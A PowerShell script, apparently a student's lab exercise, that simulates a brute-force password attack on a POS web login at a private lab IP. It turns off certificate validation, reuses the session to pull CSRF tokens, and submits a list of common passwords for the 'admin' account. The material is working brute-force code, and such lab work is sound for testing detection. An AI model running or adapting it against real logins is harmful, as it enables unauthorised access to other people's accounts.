# ==============================================================================
# Script: simulate_bruteforce.ps1
# Muc dich: Mo phong tan cong do mat khau (Brute Force) vao trang dang nhap POS
#           chay truc tiep tren moi truong PowerShell Windows nham vao may chu Linux.
# Sinh vien: Pham Vu Quang Hung - MSSV: DTC245200483 - Lop: CNTT K23C
# ==============================================================================

[CmdletBinding()]
param(
    [Parameter(Mandatory = $false)]
    [string]$TargetUrl = "https://192.168.47.128",

    [Parameter(Mandatory = $false)]
    [string]$TargetUser = "admin",

    [Parameter(Mandatory = $false)]
    [int]$Count = 20
)

# 1. Bo qua kiem tra chung chi SSL tu ky (Self-signed Certificate)
# Su dung C# delegate de tranh loi "No Runspace available to run scripts in this thread" tren Windows PowerShell
try {
    if (-not ([System.Management.Automation.PSTypeName]'TrustAll').Type) {
        Add-Type @"
            using System.Net;
            using System.Security.Cryptography.X509Certificates;
            public class TrustAll {
                public static void Enable() {
                    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                }
            }
"@
    }
    [TrustAll]::Enable()
} catch {
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
}

try {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls13
} catch {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
}

$loginUrl = "$TargetUrl/login.php"

Write-Host "============================================================" -ForegroundColor Cyan
Write-Host " [!] MO PHONG TAN CONG BRUTE FORCE DANG NHAP (POWERSHELL)" -ForegroundColor Yellow
Write-Host " Target URL : $loginUrl"
Write-Host " Target User: $TargetUser"
Write-Host " Attempts   : $Count requests"
Write-Host " Start Time : $((Get-Date).ToUniversalTime().ToString('yyyy-MM-dd HH:mm:ss UTC'))"
Write-Host " IP Nguon   : Windows Host (192.168.47.1)"
Write-Host "============================================================" -ForegroundColor Cyan

# Danh sach mat khau thu nghiem
$passwords = @(
    "123456", "password", "admin123", "welcome", "qwerty",
    "letmein", "monkey", "dragon", "sunshine", "princess",
    "football", "master", "shadow", "superman", "trustno1",
    "killer", "hunter2", "testing", "root123", "wrongpass99",
    "pass1234", "qwertyuiop", "dragon123", "admin2026", "secpos99"
)

$successfulAttempts = 0

# Khoi tao phien WebSession de quan ly cookie phien PHP (PHPSESSID)
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession

for ($i = 1; $i -le $Count; $i++) {
    $currentPass = $passwords[$($i - 1)]
    $timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-dd HH:mm:ss")

    try {
        # Buoc 1: Lay trang dang nhap de trich xuat token CSRF va cookie session
        $pageResp = Invoke-WebRequest -Uri $loginUrl -WebSession $session -UseBasicParsing -Method GET -TimeoutSec 10
        
        $csrfToken = ""
        if ($pageResp.Content -match 'name="csrf_token"\s+value="([^"]+)"') {
            $csrfToken = $matches[1]
        }

        if (-not $csrfToken) {
            Write-Host "[-] Attempt #$i : Khong lay duoc token CSRF" -ForegroundColor Red
            continue
        }

        # Buoc 2: Gui request POST voi mat khau sai
        $postData = @{
            csrf_token = $csrfToken
            username   = $TargetUser
            password   = $currentPass
        }

        $postResp = Invoke-WebRequest -Uri $loginUrl -WebSession $session -UseBasicParsing -Method POST -Body $postData -TimeoutSec 10
        $httpCode = $postResp.StatusCode

        Write-Host "[+] Attempt #$i | Time: $timestamp UTC | User: $TargetUser | Pass: $currentPass | HTTP: $httpCode" -ForegroundColor Green
        $successfulAttempts++
    }
    catch {
        $ex = $_.Exception
        $httpCode = "ERR"
        if ($ex.Response -ne $null -and $ex.Response.StatusCode -ne $null) {
            $httpCode = [int]$ex.Response.StatusCode
        }
        Write-Host "[-] Attempt #$i | Time: $timestamp UTC | User: $TargetUser | Pass: $currentPass | HTTP: $httpCode" -ForegroundColor Yellow
        $successfulAttempts++
    }

    # Nghi ngan giua cac request de mo phong tan cong lien tuc (~0.3s)
    Start-Sleep -Milliseconds 300
}

Write-Host "============================================================" -ForegroundColor Cyan
Write-Host "[+] Simulation finished: sent $successfulAttempts failed login attempts." -ForegroundColor Cyan
Write-Host "============================================================" -ForegroundColor Cyan
